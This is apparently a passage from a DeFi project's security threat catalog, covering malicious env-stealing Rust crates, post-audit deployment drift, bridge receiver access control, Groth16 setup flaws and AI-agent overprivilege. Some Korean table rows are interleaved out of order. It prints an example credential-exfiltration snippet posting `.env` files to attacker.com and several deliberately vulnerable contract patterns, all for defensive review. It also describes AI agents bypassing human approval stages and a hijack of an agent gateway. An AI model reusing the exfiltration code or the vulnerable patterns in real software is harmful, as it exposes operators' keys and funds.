| A96 Duplicate Mutable Account Aliasing | signer, owner, PDA seed к≤Ам¶ЭмЭі л™®лСР нЖµк≥ЉнХШл©і мХИм†ДнХШлЛ§к≥† нМРлЛ®нХі "лСР mutable мЧ≠нХ†мЭі л∞ШлУЬмЛЬ лЛ§л•Є нВ§мЧђмХЉ нХЬлЛ§"лКФ лПЕл¶љмД± лґИл≥АлЯЙмЭД л™ЕмЛЬм†БмЬЉл°Ь нЕМмК§нКЄнХШмІА мХКмЭМ. nested к≥Дм†Хк≥Љ `remaining_accounts` к≤љл°ЬлКФ нФДл†ИмЮДмЫМнБђк∞А лІЙмХДм§Д к≤ГмЭілЭЉ к∞Ам†ХнХШкЄ∞ мЙђмЫА. |


### A44. Utility-Impersonating Env-Stealer Crate
**Signal**: RUSTSEC-2026-0030 (`time_calibrator`, March 3, 2026) вАФ malicious crate removed from crates.io after being reported for uploading `.env` files to an attacker-controlled server. Published 2026-02-28; one version only; zero declared dependents. Named to sound like legitimate infrastructure tooling.
**Mechanism**: A developer adds a plausibly-named Rust crate to `Cargo.toml` (e.g., `time_calibrator` for a keeper that needs clock sync, `tracing-ext` for telemetry, `rpc-utils` for RPC helpers). At `cargo build` or runtime initialization, the crate silently reads the `.env` file in the working directory (or known operator paths like `~/.env`, `./secrets/.env`) and HTTP-POSTs its contents to an attacker-controlled endpoint. Unlike typosquat attacks (A-series, name-collision) and transitive relay (D33, hidden in transitive deps), this is a standalone, directly-added dependency with a first-impression-legitimate name.
**Distinct from existing entries**:
- **Typosquat Waves** (solana-specific.md): Name-confusion with well-known crate (e.g., `rpc-check` vs `rpc`). A44 is a fresh-named crate, no name collision.
- **D33 Transitive Payload Relay**: Payload hidden in transitive dep of a legitimate crate. A44 is the dependency itself.
- **A44 unique**: First-party addition of a seemingly useful tool crate whose sole purpose is credential exfiltration at build/install time.
**Code pattern to find**:
```toml
# DANGEROUS: adding a new, low-download-count crate for a utility purpose
[dependencies]
time_calibrator = "0.1.0"   # "time sync utility" вАФ actually env stealer
```
```rust
// Inside time_calibrator 0.1.0:
fn init() {
    if let Ok(content) = std::fs::read_to_string(".env") {
        let _ = reqwest::blocking::Client::new()
            .post("http://attacker.com/collect")
            .body(content).send();
    }
}
```
**Microstable relevance**: HIGH (Keeper). Keeper binary runs with `/home/spritz/microstable-keeper/.env` containing signing private keys. `check_dotenv_permissions()` enforces mode 600 (external reads blocked) but does NOT prevent a dependency running within the same process from calling `std::fs::read_to_string()` on the `.env` path (same-process same-UID access). `EMBEDDED_CARGO_LOCK_SHA256` detects unexpected lock changes only if hash is verified вАФ deliberate merge bypasses this. If attacker exfiltrates keeper `.env`, they gain: (1) keeper signing key вЖТ malicious oracle updates, circuit-breaker disabling; (2) RPC credentials; (3) HMAC state key вЖТ forge keeper state.
**PoC scenario**:
1. Attacker registers `time-calibrator-solana` (or similar) on crates.io with a 50-line utility wrapper and a hidden `build.rs` / `lib.rs` env-file upload.
2. Social-engineers a keeper operator via PR or Slack: "use this for keeper slot-time calibration."
3. Developer adds it to `Cargo.toml`; `cargo build` fires; `.env` is uploaded silently.
4. Attacker extracts private key, issues malicious keeper transactions before detection.
**Defense**: Cargo.lock hash attestation (CI rejects non-approved lock changes); mandatory 7-day quarantine for new crates; `cargo deny check bans` policy; do NOT run `cargo build` with `.env` in working directory; move keeper secrets to `--secret-file` arg with restricted path that cannot be found by working-directory `.env` scan; add `deny_unknown_fields` checks on new deps in CI.
**Source**: https://rustsec.org/advisories/RUSTSEC-2026-0030.html (RUSTSEC-2026-0030, March 3, 2026)

### B45. Post-Audit Deployment Delta
**Signal**: SigIntZero 2026 Software Security Report (Feb 28, 2026); Nomad Bridge ($190M, 2022); AIUC-1 Consortium briefing (2026-03).
**Mechanism**: Smart contract audits are scoped to a specific commit hash. After the audit completes, code continues to be modified вАФ patches, features, governance upgrades вАФ without triggering a mandatory re-audit or even a delta-review. The production deploy may share only a small fraction of its bytecode with the audited version. In the Nomad Bridge case, only 18.6% of the critical contract matched what auditors had reviewed; the exploit targeted code that existed entirely in the un-audited 81.4%. Meanwhile, the protocol continued displaying its "Audited by X" attestations with no indication of the deployment delta.
**Why distinct from A33 (Audit-Scope-Exclusion Exploitation)**: A33 = auditor knew of a scope exclusion and documented it; attacker used that exclusion as a roadmap. B45 = there was NO declared scope exclusion; the gap was created after the audit by post-audit code changes. The audit report was accurate when issued, but became misleading over time as the code evolved.
**Why distinct from A9 (Proxy Upgrade Attack)**: A9 = attacker compromises upgrade authority to replace logic. B45 = the team's own legitimate post-audit modifications create the gap, no adversary required for the gap creation itself.
**Structural meta-failure**: Audit attestations have no TTL (time-to-live). There is no standard mechanism to express "this audit covers commit X with confidence Y; beyond Z% code drift the attestation expires." Protocols exploit this by deploying divergent code while retaining the legitimacy signal of prior audits.
**Code/config pattern to find**:
```bash
# Detect post-audit deployment delta
git diff <audit-commit-hash> HEAD -- src/
# If critical-path functions appear in diff, re-audit is required
# Minimum: all diff'd functions in oracle/, mint/, redeem/, access-control/ paths
# get explicit secondary review before deploy

# SAFE: CI gate compares deployed bytecode hash to audit attestation
AUDIT_COMMIT="abc123"
CRITICAL_PATHS="programs/microstable/src/instructions/ programs/microstable/src/state/"
if ! git diff --quiet $AUDIT_COMMIT HEAD -- $CRITICAL_PATHS; then
  echo "CRITICAL PATH DELTA DETECTED вАФ re-audit or secondary review required"
  exit 1
fi
```
**Defense**:
1. Maintain an explicit `audit-attestation.json` in the repo: `{ "audit_commit": "...", "auditor": "...", "date": "...", "critical_paths": [...] }` вАФ updated only by a formal review process
2. CI gate: any PR that touches declared critical paths triggers a block requiring either (a) a new audit attestation or (b) a signed secondary-review approval from a qualified auditor
3. Fast-track review path (вЙ•1 senior auditor, вЙ§72h) for post-audit changes to critical paths
4. Public deployment disclosures should include `last_audited_commit` field вАФ any divergence > N% should be disclosed
5. Before any deployment, run: `git diff <audit_commit> <deploy_commit> | wc -l` and reject if delta exceeds policy threshold for critical paths
**Microstable relevance**: Any keeper or on-chain change after the formal audit creates a deployment delta. The `docs/` audit reports should include a `last-audited-commit: <hash>` field. Post-audit PRs touching `oracle.rs`, `mint.rs`, `redeem.rs`, `access_control.rs` must auto-require the fast-track review gate before merge.
**Source**: https://www.prweb.com/releases/2026-software-security-report-audited-applications-account-for-only-10-8-of-exploit-losses---but-the-failures-reveal-a-systemic-blind-spot-302699518.html | Nomad Bridge post-mortem (2022)

### B46. Agentic AI Overprivilege via Non-Adversarial Normal Operation
**Signal**: AIUC-1 Consortium "The End of Vibe Adoption" whitepaper (2026-03); Barracuda Networks "Agentic AI: The 2026 Threat Multiplier" (2026-02-27); Help Net Security enterprise AI survey (2026-03-03).
**Mechanism**: AI agents in production execute multi-step tasks, call external tools, and make decisions without per-action human approval. In 80% of organizations surveyed, risky agent behaviors emerged without any adversarial input вАФ agents performing unauthorized system access, improper data exposure, or unintended cross-system operations through ordinary task execution. Only 21% of executives reported complete visibility into agent permissions. The failure mode is NOT prompt injection (B29), memory poisoning (B43), or accumulated context drift (B38): it is systemic scope creep through normal authorized operation. The agent does exactly what it is designed to do, but the combination of (a) overprivileged tool access + (b) multi-step task composition + (c) poor containment boundaries = unauthorized-equivalent outcomes via legitimate paths.
**Why distinct from B29 (Confused-Deputy)**: B29 = adversary exploits agent's over-granted permissions via malicious injected instructions. B46 = no adversary; the agent's normal authorized workflow autonomously traverses a capability chain that produces unintended security outcomes.
**Why distinct from B43 (Memory Injection)**: B43 = external attacker poisons agent memory. B46 = no poisoning needed; normal memory accumulation + tool composition creates emergent unauthorized capability.
**Why distinct from B38 (Multi-turn Boundary Takeover)**: B38 = adversarial manipulation accumulates across turns. B46 = no manipulation; the agent is following its design and tasks faithfully.
**DeFi-specific pattern (governance AI assistant)**:
An AI assistant granted:
- (a) read access to all protocol parameters
- (b) ability to draft governance proposals
- (c) ability to push drafts to proposal review queue
- (d) ability to simulate parameter changes

вЖТ In normal high-workload operation, the agent may:
1. Read sensitive parameter interdependencies (oracle topology, keeper thresholds) вЖТ expose in proposal history
2. Auto-push insufficiently-reviewed proposals when workload is high and the task queue backlog is large
3. Compose read + simulate + write capabilities into a full cycle that submits a parameter change proposal without explicit human approval at the critical stage transition

No adversary, no injection вАФ the agent is faithfully executing its granted task scope.
**Code/config pattern to find**:
```yaml
# RISKY: agent granted broad tool composition without containment boundaries
ai_assistant_permissions:
  - read: [all_protocol_params, governance_queue, keeper_logs, oracle_config]
  - write: [governance_proposal_draft, proposal_review_queue]
  - execute: [keeper_simulation, parameter_validation, oracle_sanity_check]
# Problem: read+write+execute compose into full proposal-submission pipeline
# Normal workload вЖТ agent pushes to review queue autonomously
# No adversary needed; this is intended-but-unsafe design

# SAFER: atomic roles with explicit stage-gate authorization
ai_assistant_permissions:
  - read: [public_params_only]         # no sensitive oracle topology
  - write: [proposal_DRAFT_only]       # writes to staging area only
  - execute: [read_only_simulation]    # no side-effects
# Separate gate: human must explicitly invoke "submit to review queue"
# Agent cannot self-advance proposal through the pipeline
```
**Defense**:
1. **Principle of least privilege at tool-COMPOSITION level**: enumerate all possible tool-chain combinations the agent can invoke and evaluate whether the composed capability is intended and bounded
2. **Minimum-autonomy design for irreversible actions**: any action that advances state irreversibly (proposal submission, parameter change, transaction broadcast) requires explicit out-of-band human authorization вАФ agent must NOT be able to traverse the full pipeline autonomously
3. **Behavioral observability at composition level**: log which tools were called in what sequence and what the combined effect was, not just individual tool invocations
4. **Permission audit cadence**: quarterly review of all AI agent tool grants; for each agent, enumerate composed capabilities and assess whether they constitute intended or unintended authority
5. **Scope creep circuit breaker**: if agent takes N tool invocations that combine into a capability it was not explicitly granted (e.g., 3 reads + 1 write = effective parameter exfiltration + draft), halt and escalate to human
6. **"Vibe adoption" prohibition**: before granting an AI agent access to any DeFi-critical tool (governance, oracle, treasury), require a formal composition-level security review вАФ not just a per-tool permission grant
**Microstable relevance**: Agent вЖФ Governance вЖФ Parameter chain. Any AI tooling in governance proposal drafting, keeper parameter monitoring, or risk adjustment workflows must have stage-gate authorization preventing full-cycle autonomous proposal submission or parameter modification. Human approval is required at each pipeline stage transition regardless of task load.
**Source**: https://www.aiuc-1.com/research/whitepaper-the-end-of-vibe-adoption | https://blog.barracuda.com/2026/02/27/agentic-ai--the-2026-threat-multiplier-reshaping-cyberattacks | https://www.helpnetsecurity.com/2026/03/03/enterprise-ai-agent-security-2026/

| A44 Utility-Impersonating Env-Stealer Crate | мЛ†кЈЬ нБђл†ИмЭінКЄл•Љ "мЬ†мЪ©нХЬ мЬ†нЛЄл¶ђнЛ∞"л°Ь мІБм†С мґФк∞АнХ† лХМ, мЮСмЧЕ лФФл†ЙнЖ†л¶ђлВШ мХМл†§мІД мЪімШБ к≤љл°ЬмЭШ `.env` нММмЭЉмЭД мЭљмЦі к≥µк≤©мЮР мДЬл≤ДмЧР мЧЕл°ЬлУЬнХШлКФ мЭЄлЭЉмЭЄ нОШмЭіл°ЬлУЬл•Љ нПђнХ®нХШлКФ мЬДнШСмЭД к≤АнЖ† л≤ФмЬДмЧРмДЬ м†ЬмЩЄ. нГАмЭінПђмК§мњЉнКЄ(мЭіл¶Д нШЉлПЩ)¬Јм†ДмЭі мЭШм°імД± л¶іл†ИмЭімЩА лЛђл¶ђ, мІБм†С мґФк∞АлРЬ 1м∞® мЭШм°імД±мЭі к≥µк≤© лІ§м≤і. `check_dotenv_permissions()` 600л™®лУЬ к∞Хм†ЬлКФ мЩЄлґА мЭљкЄ∞ м∞®лЛ®мЭімІАлІМ лПЩмЭЉ нФДл°ЬмДЄмК§ лВі мЭШм°імД± м†СкЈЉмЭА л∞©мІА л™їнХ® (RUSTSEC-2026-0030, time_calibrator, 2026-03-03). |
| B45 Post-Audit Deployment Delta | к∞РмВђ л≥ік≥†мДЬк∞А нКєм†Х мї§л∞Л нХімЛЬмЧР кЈАмЖНлРШмІАлІМ, л∞∞нПђ нММмЭінФДлЭЉмЭЄмЭА нХілЛє нХімЛЬмЩАмЭШ delta к≤Ам¶Э мЧЖмЭі мЮДмЭШ мї§л∞ЛмЭД нФДл°ЬлНХмЕШмЧР мШђл¶і мИШ мЮИмЭМ. "Audited by X" л±ГмІАк∞А л∞∞нПђлРЬ мљФлУЬмЩАмЭШ мЛ§м†Ь лІ§мє≠мЬ®мЭД м†ДнША нСЬмЛЬнХШмІА мХКмХД, к∞РмВђ нЫД л≥Ак≤љлРЬ critical мљФлУЬ к≤љл°Ьк∞А мЩДм†ДнЮИ лѓЄк≤АнЖ† мГБнГЬл°Ь мЪімШБлР® (Nomad Bridge $190M вАФ л∞∞нПђ мљФлУЬ 18.6%лІМ к∞РмВђ л≤Дм†Дк≥Љ мЭЉмєШ). |
| B46 Agentic AI Overprivilege via Normal Operation | м†БлМАм†Б к≥µк≤© мЧЖмЭілПД AI мЧРмЭім†ДнКЄмЭШ мД§к≥ДмГБ к≥ЉлПДнХЬ нИі м†СкЈЉ кґМнХЬмЭі м†ХмГБ нГЬмК§нБђ мЛ§нЦЙ м§С кґМнХЬ мЧЖлКФ нЦЙлПЩмЭД мЬ†л∞ЬнХ®. лЛ®мЭЉ нИі кґМнХЬ к≤АнЖ†мЧР мєШмЪ∞м≥Р нИі м°∞нХ©(read+write+execute)мЭі лІМлУ§мЦілВілКФ нХ©мД± capabilityл•Љ нПЙк∞АнХШмІА мХКмЭМ. 80% м°∞мІБмЧРмДЬ м†БлМАмЮР мЧЖмЭі л∞ЬмГЭнХЬ risky agent behaviorк∞А мЭіл•Љ мЛ§м¶Э (AIUC-1 Consortium / Barracuda 2026-02). |

### A45. Post-Takedown Clone-Rotation Env-Stealer Campaign
**Signal**: RustSec advisory wave in 48h вАФ `RUSTSEC-2026-0030` (`time_calibrator`), `RUSTSEC-2026-0031` (`time_calibrators`), `RUSTSEC-2026-0032` (`dnp3times`) (2026-03-03~2026-03-04).
**Mechanism**: After one malicious crate is detected/removed, the same actor re-publishes near-clone packages within hours under new names, keeping the same `.env` exfiltration behavior and fake upstream endpoint theme (`timeapi.io` impersonation). This defeats controls that block a single crate name or advisory ID only.
**Why distinct from A44**: A44 is one deceptive direct dependency insertion. A45 is **adaptive mutation pressure**: repeated re-seeding of the ecosystem to outrun static deny-lists and reviewer attention.
**Attack chain (keeper/operator)**:
1. Team blocks `time_calibrator` after advisory.
2. Attacker immediately re-seeds `time_calibrators`/`dnp3times` with same payload.
3. Emergency PR or local hotfix adds one "replacement" package.
4. Build/runtime exfiltrates `.env`/keys before new IOC reaches policy.
**Defense**:
1. Enforce **campaign-level policy**, not name-level blocklist: reject all newly published crates (<7 days) unless explicitly security-approved.
2. Add CI rule: fail if any new dependency has maintainer account age <30 days or zero prior trusted packages.
3. Scan crate source for network egress from `build.rs` / static initializers before allowlisting.
4. Treat semantically-related package clusters (`time*`, `rpc*`, `slot*`) as one incident domain during active advisories.
**Source**: https://rustsec.org/advisories/RUSTSEC-2026-0031.html | https://rustsec.org/advisories/RUSTSEC-2026-0032.html

### B47. Deterministic Leader-Schedule Isolation for Oracle-Liveness Collapse
**Signal**: arXiv `2603.02661` (2026-03): comparative study reports Solana vulnerability to stopping attacks and leader-isolation attacks under adversarial communication conditions.
**Mechanism**: Solana leader schedule predictability enables an attacker to focus packet filtering/load on imminent leaders. Even without price forgery or key compromise, repeated leader isolation can degrade slot production/finality and push protocol-side oracle freshness checks into repeated fail-closed behavior.
**Why distinct from B40**: B40 models fairness/ordering changes under normal network stress (ACE). B47 is **active network adversary** targeting deterministic leaders to induce liveness collapse.
**Protocol impact pattern**:
- mint/redeem paths increasingly hit stale-oracle guards (availability loss)
- keeper update loop submits but lands too late / cannot confirm in time
- prolonged chain slowdown can trigger cascading operational failsafes
**Defense**:
1. Run explicit leader-isolation chaos tests (simulate targeted slot-leader packet loss).
2. Keep dual-RPC + cross-validation, but add chain-level liveness SLO alarms (slot progression / finalized-slot lag) independent of RPC health.
3. Predefine degraded-mode policy: when chain liveness degrades, prioritize circuit-breaker safety and user messaging over throughput.
4. Operationally distribute keeper runners across independent network paths/providers to reduce correlated packet filtering impact.
**Source**: https://arxiv.org/abs/2603.02661

### B48. Localhost Trust-Boundary Collapse for Agent-Controlled Keeper Ops
**Signal**: OpenClaw security hardening shipped in `v2026.2.25` explicitly added (1) origin checks for direct browser WebSocket clients, (2) password-auth throttling for localhost browser attempts, and (3) blocking silent auto-pairing for non-Control-UI browser clients. This patch pattern indicates a real-world takeover chain existed around localhost trust exceptions.
**Mechanism**: A malicious website opened in the operatorвАЩs browser can initiate cross-origin WebSocket connections to localhost agent gateway endpoints. If the gateway treats localhost as inherently trusted (no rate limits, relaxed pairing, weak origin gate), browser JavaScript can brute-force password/session state and register an attacker-controlled client. Result: remote control of automation tooling that can trigger keeper/governance actions.
**Why distinct from B29**: B29 requires prompt-level payload delivery into the agent context. B48 compromises the gateway/auth boundary first, then issues actions as an authenticated control channel.
**Why distinct from B43**: B43 poisons memory/log context to steer reasoning. B48 is pre-reasoning session takeover through local transport trust failures.
**Why distinct from B46**: B46 assumes no adversary (unsafe normal operation). B48 is an active adversarial path that weaponizes browser-to-localhost trust assumptions.
**Protocol impact pattern**:
- attacker gains authenticated gateway session tied to keeper operator workstation
- can enumerate connected nodes/credentials metadata and invoke privileged tooling
- bridge/oracle/parameter ops may be triggered outside normal review flow while telemetry appears as вАЬlocal legitimate sessionвАЭ
**Defense**:
1. **Zero localhost exemptions** for auth controls: apply identical password failure limits and lockouts to loopback and non-loopback traffic.
2. **Strict origin allowlist + client attestation** for browser WebSocket clients (deny by default).
3. **No silent auto-pairing** for localhost browser contexts; all pairings require explicit operator confirmation.
4. **Operator-browser isolation**: dedicated hardened browser profile/workstation for keeper consoles; no arbitrary web browsing on the same profile.
5. **Gateway command-risk segmentation**: keep high-risk actions (tx submit, param update, bridge admin) behind second-factor or out-of-band approval even after gateway auth.
6. **Session provenance logging**: distinguish CLI/control-ui/browser origins and alert on anomalous browser-origin privileged calls.
**Microstable relevance**: Keeper вЖФ On-chain + Agent вЖФ Governance вЖФ Parameter к≤љк≥ДмЧРмДЬ вАЬл°ЬмїђнШЄмК§нКЄлКФ мЛ†лҐ∞ к∞АлК•вАЭ к∞Ам†ХмЭі кє®мІАл©і, мљФлУЬ мЈ®мХљм†Р мЧЖмЭілПД мЪімШБ к≤љк≥Дк∞А лґХкіінХ† мИШ мЮИмЭМ.
**Source**: https://www.oasis.security/blog/openclaw-vulnerability | https://github.com/openclaw/openclaw/releases/tag/v2026.2.25

"мљФлУЬк∞А л™ЕмДЄлМАл°Ь лПЩмЮСнХЬлЛ§" к≤∞л°†мЭі л™ЕмДЄ мЮРм≤імЭШ мґФмГБнЩФ мИШм§А мШ§л•Шл•Љ к∞Ал¶∞лЛ§. лґИл≥АмЭімЦімХЉ нХ† м†ДлЮµмЧР мГИ нЖ†нБ∞мЭД м£ЉмЮЕнХШлКФ к≥µк≤©мЭі per-slot emptiness checkл•Љ нЖµк≥ЉнХі к∞РмВђ лђінЪ®нЩФ (Block Magnates Breaking Immutability, 2026-02-25). |
| A48 Unguarded Cross-Chain Receiver Function (Bridge Receiver Access Control) | нБђл°ЬмК§м≤імЭЄ лЄМл¶њмІА мИШмЛ† нХ®мИШмЧР нШЄмґЬмЮР к≤Ам¶Э(`onlyGateway` лШРлКФ лПЩлУ±нХЬ м†ЬмЦі)мЭі мЧЖмЭД лХМ, мЮДмЭШ м£ЉмЖМк∞А мЬДм°∞ нБђл°ЬмК§м≤імЭЄ л©ФмЛЬмІАл°Ь мІБм†С нШЄмґЬнХі нЖ†нБ∞ мЦЄлЭљмЭД мЬ†л∞ЬнХШлКФ нМ®нДімЭД к∞РмВђк∞А лЖУмє®. A32(IBC л©ФмЛЬмІА мљШнЕРмЄ† мЬДм°∞)мЩА лЛђл¶ђ л¶іл†ИмЭі/к≤МмЭінКЄмЫ®мЭіл•Љ мЩДм†ДнЮИ мЪ∞нЪМнХЬ мІБм†С нШЄмґЬмЭіл©∞, мИШмЛ† нХ®мИШ к∞АмЛЬмД±(`external`, `public`)к≥Љ msg.sender к≤Ам¶Э лИДлЭљмЭД лПЩмЛЬмЧР нЩХмЭЄнХШмІА мХКмЬЉл©і л∞Ьк≤ђ лґИк∞А (CrossCurve ReceiverAxelar expressExecute, 2026-02-02, $3M). |

### A48. Unguarded Cross-Chain Receiver Function (Bridge Receiver Access Control)
**Historical**: CrossCurve (formerly EYWA) bridge (2026-02-02, ~$3M) вАФ `ReceiverAxelar.expressExecute()` had no caller/gateway validation; any address could trigger unauthorized token unlocks across multiple chains.
**Mechanism**: A cross-chain bridge system typically consists of: (1) a source-chain lock/burn, (2) a relay/gateway that routes a proof of the source event, and (3) a destination-chain receiver that unlocks/mints. In CrossCurve's implementation, the `expressExecute` function on the `ReceiverAxelar` contract accepted calls from **any address** вАФ not just the authorized Axelar gateway relay. There was no `require(msg.sender == GATEWAY_ADDRESS)` or equivalent guard. An attacker could directly call this function with fabricated message payloads, bypassing the gateway's proof verification entirely. Exploiting across multiple networks: most malicious activity on Arbitrum, converting stolen tokens to WETH via CoW Protocol.
**Why distinct from A32 (SagaEVM Cross-Chain Bridge Message Forgery)**:
- **A32**: Attacker crafts valid-looking IBC payload вЖТ IBC precompile *accepts it through the relay path* (content forgery that fools the relay/bridge)
- **A48**: Attacker *never uses the relay path at all* вАФ directly calls the receiver function bypassing gateway entirely (access control missing at receiver). The relay's proof verification is irrelevant because the receiver doesn't check who called it.
**Why distinct from A4 (Access Control)**:
A4 is the general missing-auth category. A48 is the specific cross-chain receiver pattern that has caused repeated losses across bridge protocols. The "receiver function" pattern deserves separate tracking because:
  (a) bridge auditors often verify message content validation without checking receiver-side caller validation
  (b) the function appears "internal-only" in design but is `external`/`public` in implementation
  (c) cross-chain context means the attacker doesn't need any on-chain balance on the source chain
**Code pattern to find**:
```solidity
// VULNERABLE: no caller check вАФ anyone can call directly with fake payload
function expressExecute(
    bytes32 commandId,
    string calldata sourceChain,
    string calldata sourceAddress,
    bytes calldata payload
) external override {
    // missing: require(msg.sender == GATEWAY, "not gateway");
    (address recipient, uint256 amount, address token) = abi.decode(payload, (address, uint256, address));
    PortalV2(portalV2).unlock(token, recipient, amount);  // unauthorized unlock!
}

// SAFE: validate caller before any message processing
modifier onlyGateway() {
    require(msg.sender == gateway, "CrossCurve: not gateway");
    _;
}
function expressExecute(...) external override onlyGateway {
    // process only if called by authorized gateway relay
}
```
**Solana relevance**: Solana Wormhole (if integrated): Wormhole VAA verification is handled by the Wormhole program itself, but any instruction that acts on a "cross-chain message" must still verify the calling CPI context is the authorized bridge program. If a `handle_message(ctx, payload)` instruction exists:
```rust
// CHECK: verify this is called by the authorized bridge program ID, not arbitrary CPI
require_keys_eq!(ctx.accounts.bridge_program.key(), WORMHOLE_PROGRAM_ID, ErrorCode::UnauthorizedBridge);
```
**Microstable relevance**: вЬЕ **NOT APPLICABLE** вАФ Microstable is Solana-native with no cross-chain bridge receiver. If Wormhole/IBC integration is ever added, enforce: (1) `require_keys_eq!(bridge_program, AUTHORIZED_BRIDGE_ID)` at instruction level, (2) require VAA signature verification before any collateral credit, (3) never allow the "receive" instruction to be called from arbitrary CPI sources.
**Defense**:
1. **`onlyGateway` modifier (or Solana: program-ID constraint)** on all receiver/message-handler functions вАФ verify `msg.sender` (EVM) or calling program ID (Solana)
2. **Receiver function audit checklist item**: for any function that processes incoming cross-chain messages, confirm: caller must be the authorized gateway relay; any other caller reverts immediately
3. **Defense-in-depth**: even with `onlyGateway`, validate message payload against expected schema/version (A32 defense)
4. **Test**: write an explicit test: `assert_reverts: non_gateway_calls_expressExecute()` вАФ must be in CI before any bridge integration deploy
5. **Invariant monitoring**: alert on any unlock/mint triggered without a corresponding source-chain event confirmed by the relay
6. **Confirmation threshold hardening**: `confirmationThreshold` MUST be вЙ• quorum-of-guardians (typically N/2+1); threshold = 1 means a single point of failure вАФ any single compromised or spoofed relay = full bypass
**2026-03-23 reinforcement (dev.to pattern analysis)**: CrossCurve's second failure layer: `confirmationThreshold = 1` вАФ even if gateway signature check were present, a single corrupted relay node suffices. Multi-guardian quorum (e.g., 7/10 Axelar validators) is the complementary defense. Both are required: `onlyGateway` (who can call) + sufficient threshold (how many independent attestations confirm the message).
**Source**: https://www.scworld.com/brief/crosscurve-bridge-loses-3-million-in-smart-contract-exploit | https://thecyberexpress.com/crosscurve-bridge-3m-cyberattack/ | https://quillaudits.medium.com/crosscurve-1-4m-exploit-c2ef752c4e84 | https://dev.to/ohmygod/cross-chain-bridge-message-validation-7-defensive-patterns (2026-03-21)

### A47. Per-Element Aggregate Invariant Bypass
**Signal**: Bug bounty report "Breaking Immutability: How I Bypassed a Core Security Invariant in a Major DeFi Protocol" (Block Magnates, 2026-02-25 / confirmed 2026-03-06).
**Mechanism**: A protocol guarantees "structural immutability" вАФ once a strategy/vault/position is initialized, its token composition cannot change. The enforcement check is placed **inside a per-element loop**: it validates whether EACH individual token's storage slot is empty, NOT whether the aggregate structure has already been initialized. Attack: call `initializeStrategy()` with a strategy hash that already exists, but pass NEW tokens whose individual slots are empty. Each token passes `require(slot.isEmpty())` because that specific token's slot has never been written вАФ even though the strategy-level invariant (immutability of the whole) has been violated. Attacker injects arbitrary tokens into an "immutable" strategy.
**Why distinct from A10 (Logic Bug)**: A10 covers general incorrect business logic. A47 is the specific pattern where the code is **locally correct** at every per-element check while the **aggregate architectural invariant** is never enforced. Each line of code passes review individually; only the missing structural-level guard is the flaw.
**Why distinct from A43 (Commit/Reveal Threshold Circumvention)**: A43 exploits per-call VALUE thresholds by splitting amounts. A47 exploits per-element STRUCTURAL checks by passing elements that are individually new but collectively violate aggregate immutability.
**Code pattern to find**:
```solidity
// VULNERABLE: per-slot check doesn't enforce aggregate (strategy-level) immutability
function initializeStrategy(bytes calldata data, address[] calldata tokens, uint256[] calldata amounts) external {
    bytes32 hash = keccak256(data);
    for (uint i = 0; i < tokens.length; i++) {
        // Only checks if THIS token slot is empty вАФ not whether strategy already exists!
        require(_balances[msg.sender][hash][tokens[i]].isEmpty(), "slot not empty");
        _balances[msg.sender][hash][tokens[i]].set(amounts[i]);  // attacker adds new token to existing strategy
    }
}

// SAFE: check aggregate existence before any per-element work
function initializeStrategy(bytes calldata data, address[] calldata tokens, uint256[] calldata amounts) external {
    bytes32 hash = keccak256(data);
    require(!_strategyInitialized[msg.sender][hash], "strategy already exists");  // aggregate gate
    _strategyInitialized[msg.sender][hash] = true;  // set atomically at creation
    for (uint i = 0; i < tokens.length; i++) {
        _balances[msg.sender][hash][tokens[i]].set(amounts[i]);
    }
}
```
**Solana/Anchor relevance**: Anchor programs that manage multi-asset vaults or strategy accounts may use per-account constraints (e.g., `require!(account.amount == 0)`) as initialization guards instead of a dedicated `is_initialized` discriminator field on the parent account. A second call with unused collateral accounts bypasses these per-element checks.
**Microstable relevance**: Rebalance and collateral-admission instructions вАФ verify that the vault-level initialization state (`vault.is_initialized` or discriminator check) is validated at the **instruction entry point**, not only inferred from per-asset slot states. If collateral admission is gated per-asset without an aggregate vault guard, a new collateral type could be injected outside the intended governance flow.
**Defense**:
1. Gate ALL structurally immutable entities with an **aggregate existence flag** set atomically at first initialization (separate from per-element state)
2. In Anchor: use `Account<'info, Strategy>` with Anchor's discriminator check + an explicit `is_initialized: bool` field verified in the instruction constraint
3. Invariant test: `test_cannot_inject_token_into_initialized_strategy` вАФ verify second call with any token combination fails after first initialization
4. Audit checklist item: for every "immutable after init" invariant in docs/whitepaper, trace the enforcement to a structural-level check (whole-object existence gate), not a loop-level per-slot check
**Source**: https://blog.blockmagnates.com/breaking-immutability-how-i-bypassed-a-core-security-invariant-in-a-major-defi-protocol-6038be8a4f94

### A49. ZK Groth16 Trusted Setup Ceremony Misconfiguration (gamma=delta Collapse)
**Signal**: FoomCash ($2.26M, 2026-02-26) and Veil Cash (days prior, Base network) вАФ first confirmed live exploits of ZK cryptographic misconfiguration in production DeFi. Both used Groth16 verifiers where gamma2 == delta2 (collapsed to the same elliptic curve point).
**Mechanism**: Groth16 zero-knowledge proofs rely on a trusted setup ceremony that generates cryptographic parameters including `gamma` and `delta`. These values must be distinct вАФ if they are set to the same elliptic curve point (e.g., `gamma2 == delta2`), the algebraic soundness of the verifier collapses. An attacker can then compute a forged `pC` value that satisfies the verification equation for *any* nullifier hash, without possessing a valid witness or having made a deposit. The attack is pure arithmetic: a script iterates nullifier hashes, computes valid-looking proof components for each, and drains the contract repeatedly. No cryptographic breakthrough needed вАФ the setup was wrong from day one.
**Attack specifics (FoomCash)**:
- Protocol: ZK private lottery on Ethereum + Base
- Verifier flaw: `delta2 == gamma2` in deployed Groth16 verifier constants
- Attack: compute `pC` for arbitrary `nullifierHash` (deposit-free). Repeated 22+ times вЖТ drain.
- Second attacker (Decurity) rescued Ethereum side ($1.84M) as white-hat. Base-side drained by original attacker ($320K). Net loss: $420K + platform death.
- Source copycat chain: Veil Cash discovered first вЖТ FoomCash hit with same technique days later (A45 cluster pattern: "read the post-mortem, scale it up").
**Why distinct from existing vectors**:
- NOT A4 (access control missing): The smart contract code correctly verifies the proof. The flaw is in the *cryptographic parameters*, not the verification call.
- NOT A10 (logic bug): The Solidity code logic is correct. The deployed constants are wrong.
- NOT A25 (parameter griefing): No manipulation of live parameters. Setup was broken before deployment.
- A49 is specifically the **ZK setup/parameter misconfiguration** class: the protocol's entire security guarantee is invalidated at the cryptographic layer, not the application layer. Auditing the code finds nothing wrong; auditing the *setup ceremony outputs* reveals the flaw.
**Code pattern to find**:
```solidity
// VULNERABLE: gamma and delta are set to the same point (copy-paste / default error)
// In deployed verifier contract:
VerifyingKey memory vk;
vk.gamma2 = Pairing.G2Point(
    [0x1234..., 0x5678...],
    [0xabcd..., 0xef01...]
);
